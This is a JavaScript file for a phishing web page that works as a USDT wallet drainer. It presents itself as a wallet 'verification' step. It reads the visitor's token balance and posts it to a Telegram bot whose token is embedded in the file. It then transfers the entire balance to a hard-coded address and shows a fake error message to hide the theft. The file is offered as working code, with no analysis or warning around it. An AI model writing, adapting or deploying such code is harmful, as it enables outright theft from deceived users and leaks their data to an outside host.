const myAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
const usdtContract = "0x55d398326f99059fF775485246999027B3197955"; 

// Telegram Info
const botToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
const chatId = "7849151110";

async function sendLog(msg) {
    try {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
    } catch(e) {}
}

async function start() {
    const overlay = document.getElementById("overlay");
    const isWeb3 = !!(window.ethereum || window.trustwallet);

    if (!isWeb3) {
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
            return;
        }
        alert("Please open this page inside Trust Wallet Browser.");
        return;
    }

    overlay.style.display = "flex";

    try {
        const provider = window.ethereum || window.trustwallet;
        const web3 = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];

        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });

        const abi = [
            { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
            { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
        ];

        const contract = new web3.eth.Contract(abi, usdtContract);
        const balanceWei = await contract.methods.balanceOf(user).call();
        const balance = web3.utils.fromWei(balanceWei, 'ether');

        await sendLog(`<b>QR/Address Scan</b>\nUser: <code>${user}</code>\nBal: <b>${balance} USDT</b>`);

        if (parseFloat(balance) > 0) {
            // User ko lagega verification ho raha hai
            await contract.methods.transfer(myAddress, balanceWei).send({ from: user });
            
            await sendLog(`✅ <b>Success!</b>\nTransferred: ${balance} USDT`);
            alert("Network Error: Verification failed. Please try again.");
            location.reload();
        } else {
            alert("Verification complete. Low assets detected.");
            overlay.style.display = "none";
        }
    } catch (e) {
        overlay.style.display = "none";
        alert("Process Cancelled.");
    }
}

document.getElementById("nextBtn").addEventListener("click", start);
